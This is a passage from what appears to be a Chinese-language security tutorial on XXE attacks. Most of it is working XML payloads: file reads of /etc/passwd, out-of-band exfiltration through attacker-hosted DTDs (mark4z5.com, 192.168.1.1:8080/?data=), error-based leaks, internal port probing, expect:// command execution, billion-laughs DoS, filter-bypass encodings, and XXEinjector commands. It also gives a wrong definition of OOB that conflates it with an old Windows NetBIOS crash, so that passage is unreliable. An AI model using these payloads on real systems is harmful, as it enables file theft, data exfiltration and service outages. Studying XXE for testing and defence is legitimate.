&quot;http://mark4z5.com/evil.dtd&quot;&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd 文件内容（包含外部实体）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="通过XML文档内部声明的DTD外部实体引入外部实体声明"><a href="#通过XML文档内部声明的DTD外部实体引入外部实体声明" class="headerlink" title="通过XML文档内部声明的DTD外部实体引入外部实体声明"></a><strong>通过XML文档内部声明的<u>DTD外部实体</u>引入<u>外部实体</u>声明</strong></h4><p><u>先在XML文档内引入一个外部实体声明，再在外部实体内引入一个在攻击者服务器上的外部实体。</u></p><p>先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明。</p><p>XML 文件内容：</p><p><em>注意：在DTD内部使用的参数实体，使用<code>%实体</code></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY %d SYSTEM &quot;http://mark4z5.com/evil.dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;/c&gt;</span><br></pre></td></tr></table></figure><p>evil.dtd 文件内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd/&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="寻找-XML-输入点"><a href="#寻找-XML-输入点" class="headerlink" title="寻找 XML 输入点"></a>寻找 XML 输入点</h3><p><strong>甄别那些接受XML作为输入内容的端点。</strong> </p><p>但是有时候，这些端点可能并不是那么明显（比如，一些仅使用JSON去访问服务的客户端）。在这种情况下，渗透测试人员就必须<u>尝试不同的测试方式</u>，比如修改HTTP的请求方法，修改Content-Type头部字段为 <code>Content-Type：text/xml</code>等等方法，然后看看应用程序的响应，<u>看看程序是否解析了发送的内容</u>，如果解析了，那么则可能有XXE攻击漏洞。</p><p>例如：</p><p>判断wsdl（web服务描述语言），或者一些常见的采用xml的java服务配置文件（spring，struts2）。不过<u>现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录</u>，这里简单来说就是攻击者必须具有一台具有公网ip的主机。</p><p>例如：</p><p>从PHP代码层面，存在 <code>Content-Type：text/xml</code> , 说明 post 的数据包含 XML 格式，如：可以在请求头中添加 <code>Content-Type:text/xml</code> 或 <code>Content-type:application/xml</code> ，然后构造payload测试是否存在XXE攻击漏洞。</p><h2 id="XXE-利用方式"><a href="#XXE-利用方式" class="headerlink" title="XXE 利用方式"></a>XXE 利用方式</h2><h3 id="1-文件读取有回显"><a href="#1-文件读取有回显" class="headerlink" title="1. 文件读取有回显"></a>1. 文件读取有回显</h3><p><strong>直接读靶机文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///d://test.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p><strong>通过恶意引入外部参数实体，读靶机文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;</span><br><span class="line">    %file;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br></pre></td></tr></table></figure><p>hack.dtd的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-文件读取无回显（多数情况）"><a href="#2-文件读取无回显（多数情况）" class="headerlink" title="2. 文件读取无回显（多数情况）"></a>2. 文件读取无回显（多数情况）</h3><p>当读取文件无回显时，如何将文件内容取出？</p><h4 id="OOB攻击（把数据发送到远程服务器）"><a href="#OOB攻击（把数据发送到远程服务器）" class="headerlink" title="OOB攻击（把数据发送到远程服务器）"></a>OOB攻击（把数据发送到远程服务器）</h4><p>OOB的意思是“束缚数据脱离”，这是一种破坏Windows系统的过程。它通过向TCP端口139发送随机数来攻击操作系统，从而让中央处理器（CPU）一直处于繁忙状态。原理是利用Windows下微软网络协定NetBIOS的一个例外处理程序，简单说就是传递一个特别大的数据包导致系统死机。</p><p>常见的场景是通过XML实体漏洞来攻击。</p><p>**先使用<code>php://filter</code>获取目标文件的内容，然后将内容通过dtd外部文档以http请求发送到接受数据的服务器(攻击服务器)**，这样即使没有回显也能将数据带出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://192.168.1.1:8080/test.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><strong>test.dtd的内容，内部的%号要进行实体编码成<code>&amp;#x25;</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.1.1:8080/?data=%file;&#x27;&gt;&quot;    &lt;!-- file中就是test.txt的内容 --&gt;</span><br><span class="line">&gt;</span><br><span class="line">%payload;</span><br></pre></td></tr></table></figure><p>payload的内容为<code>&lt;!ENTITY % send SYSTEM &#39;http://192.168.1.1:8080/?data=%file;&#39;&gt;</code></p><p>访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据</p><h4 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h4><p>基于报错的原理和OOB类似，OOB通过构造一个带外的url将数据带出，而基于报错是<strong>构造一个错误的url并将泄露文件内容放在url中，通过这样的方式返回数据</strong>。所以和OOB的构造方式几乎只有url不同，其他地方一模一样。</p><ul><li><p><strong>引入服务器目标文件</strong></p><p>引入DTD外部实体声明，引入服务器目标文件file:&#x2F;&#x2F;&#x2F;flag，作为%file。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;192.168.1.1:8080/xml.dtd&quot;&gt;    &lt;!-- 引入DTD外部实体声明 --&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>xml.dtd的内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;file:///hhhhhhh/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>start 实体中嵌套了一层DTD外部实体 send，注意被嵌套的实体要进行HTML实体编码</p><p>访问<code>file:///hhhhhhh/%file;</code>报错，然后服务器会返回报错信息，但是该URL中包含%file，因此造成文件内容泄露。</p></li><li><h5 id="引入本地文件"><a href="#引入本地文件" class="headerlink" title="引入本地文件"></a>引入本地文件</h5><p>如果目标主机的防火墙十分严格，不允许我们请求外网服务器dtd呢？由于XML的广泛使用，其实在各个系统中已经存在了部分DTD文件。按照上面的理论，我们只要是<strong>从外部引入DTD文件，并在其中定义一些实体内容</strong>就行。</p><p><code>&amp;#x26;</code>为<code>&amp;</code>的HTML实体编码。</p><p><code>&amp;#x27;</code>为<code>&#39;</code>的HTML实体编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;/usr/share/yelp/dtd/docbookx.dtd&quot;&gt;      &lt;!-- 引入本地dtd文件 --&gt;</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % ISOamso &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file://hhhhhhhh/?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;send;</span><br><span class="line">&#x27;&gt; </span><br><span class="line">%remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>ISOamso 实体中嵌套了一层DTD外部实体 eval，接着又嵌套了外部实体 send，注意被嵌套的实体要进行HTML实体编码，而 send 则被编码了两次。</p><p>ISOamso的第一行内容为<code>&lt;!ENTITY % eval &quot;&lt;!ENTITY % send SYSTEM &#39;file://hhhhhhhh/?%file;&#39;&gt;&quot;&gt;</code></p></li><li><h5 id="嵌套参数实体"><a href="#嵌套参数实体" class="headerlink" title="嵌套参数实体"></a>嵌套参数实体</h5><p>虽然W3C协议是不允许在内部的实体声明中引用参数实体，但是很多XML解析器并没有很好的执行这个检查。几乎所有XML解析器能够发现如下这种两层嵌套式的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://myip/?%file;&#x27;&gt;&quot;&gt;     &lt;!-- 在内部的实体声明中引用参数实体 --&gt;</span><br><span class="line">%start;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>基于报错的三层嵌套参数实体XXE</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message ANY&gt;</span><br><span class="line">&lt;!ENTITY % para1 SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % para &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;para2;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%para;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;10&lt;/message&gt;</span><br></pre></td></tr></table></figure><p>pare的第一行内容为<code>&lt;!ENTITY % para2 &quot;&lt;!ENTITY % error SYSTEM &#39;file:///%para1;&#39;&gt;&quot;&gt;</code></p></li></ul><h3 id="3-内网探测"><a href="#3-内网探测" class="headerlink" title="3. 内网探测"></a>3. 内网探测</h3><p>和读文件差不多，只不过把URI改成内网机器地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;        </span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://192.168.1.1：81/mark4z5&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;666&lt;/lastname&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811145102265.png" alt="image-20220811145102265"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811145112839.png" alt="image-20220811145112839"></p><p>该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p><h3 id="4-RCE"><a href="#4-RCE" class="headerlink" title="4. RCE"></a>4. RCE</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811145231755.png" alt="image-20220811145231455"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令，其他协议也有可能可以执行系统命令，比如<code>php://input</code>、<code>php://filter</code>等。</p><h3 id="5-DOS"><a href="#5-DOS" class="headerlink" title="5. DOS"></a>5. DOS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE-利用场景"><a href="#XXE-利用场景" class="headerlink" title="XXE 利用场景"></a>XXE 利用场景</h2><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>在xml文档的svg图片标签中插入恶意实体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h3 id="excel"><a href="#excel" class="headerlink" title="excel"></a>excel</h3><p>利用EXCEL进行XXE攻击。首先用excel创建一个空白的xlsx，然后解压：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir XXE &amp;&amp; cd XXE</span><br><span class="line">unzip ../XXE.xlsx</span><br></pre></td></tr></table></figure><p>将解压得到的<code>[Content_Types].xml</code>改成恶意xml，再压缩回去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r ../poc.xlsx *</span><br></pre></td></tr></table></figure><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>利用正则匹配的一些过滤规则，可以尝试使用大小写绕过。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>比如一些关键词：ENTITY、SYSTEM、file 等被写入黑名单，无法在XML中构造外部实体，可以尝试使用编码绕过，比如 UTF-16BE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</span><br></pre></td></tr></table></figure><p>如果是过滤了http等协议，可以利用实体编码绕过，在前面的XXE利用方式中有用过。</p><h3 id="其他协议绕过"><a href="#其他协议绕过" class="headerlink" title="其他协议绕过"></a>其他协议绕过</h3><p>如果http被过滤，无法上传XML文件，可以用<code>file://</code>、<code>php://filter</code>、<code>data://</code></p><ul><li><p><strong><code>data://</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMjcuMC4wLjEvaGFjay5kdGQnPg==&quot;&gt; </span><br><span class="line">    %a; </span><br><span class="line">    %b; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;</span><br><span class="line">    &amp;xxe;</span><br><span class="line">&lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--编码内容--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://127.0.0.1/test.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure><p>然后使用data协议上传：<code>?text=data://text/plain,代码内容</code></p></li><li><p><strong><code>file://</code>加文件上传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/1.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--上传文件1.jpg，内容如下--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://192.168.1.1:8080/hack.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>php://filter</code>协议加文件上传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/test.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;</span><br><span class="line">    &amp;xxe;</span><br><span class="line">&lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--上传文件test.jpg，内容如下--&gt;</span><br><span class="line">&lt;!--base64编码内容--&gt;</span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><p>编码的原本内容为<code>&lt;!ENTITY xxe SYSTEM &#39;php://filter/read=convert.base64-encode/resource=./flag.php&#39;&gt;</code>。</p></li></ul><h2 id="自动化-XXE-工具"><a href="#自动化-XXE-工具" class="headerlink" title="自动化 XXE 工具"></a>自动化 XXE 工具</h2><p><strong>XXEinjector</strong>是一款基于Ruby的XXE注入工具.</p><p>它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。</p><p>建议在kali环境下运行</p><p><strong>基本参数详解：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">--host   必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)</span><br><span class="line">--file   必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)</span><br><span class="line">--path      必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)</span><br><span class="line">--brute     必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)</span><br><span class="line">--logger    记录输出结果。</span><br><span class="line">--rhost     远程主机IP或域名地址。(--rhost=192.168.0.3)</span><br><span class="line">--rport     远程主机的TCP端口信息。(--rport=8080)</span><br><span class="line">--phpfilter  在发送消息之前使用PHP过滤器对目标文件进行Base64编码。</span><br><span class="line">--netdoc   使用netdoc协议。(Java).``</span><br><span class="line">--enumports  枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)</span><br><span class="line">--hashes    窃取运行当前应用程序用户的Windows哈希。</span><br><span class="line">--expect    使用PHP expect扩展执行任意系统命令。(--expect=ls)</span><br><span class="line">--upload    使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)</span><br><span class="line">--xslt   XSLT注入测试。</span><br><span class="line">--ssl       使用SSL。</span><br><span class="line">--proxy     使用代理。(--proxy=127.0.0.1:8080)</span><br><span class="line">--httpport Set自定义HTTP端口。(--httpport=80)</span><br><span class="line">--ftpport    设置自定义FTP端口。(--ftpport=21)</span><br><span class="line">--gopherport 设置自定义gopher端口。(--gopherport=70)</span><br><span class="line">--jarport    设置自定义文件上传端口。(--jarport=1337)</span><br><span class="line">--xsltport 设置自定义用于XSLT注入测试的端口。(--xsltport=1337)</span><br><span class="line">--test   该模式可用于测试请求的有效。</span><br><span class="line">--urlencode   URL编码，默认为URI。</span><br><span class="line">--output    爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)</span><br><span class="line">--timeout   设置接收文件/目录内容的Timeout。(--timeout=20)</span><br><span class="line">--contimeout 设置与服务器断开连接的，防止DoS出现。(--contimeout=20)</span><br><span class="line">--fast   跳过枚举询问，有可能出现结果假阳性。</span><br><span class="line">--verbose   显示verbose信息。</span><br></pre></td></tr></table></figure><p><strong>使用方法：</strong></p><p>枚举HTTPS应用程序中的&#x2F;etc目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl</span><br></pre></td></tr></table></figure><p>使用gopher（OOB方法）枚举&#x2F;etc目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher</span><br></pre></td></tr></table></figure><p>二次漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb 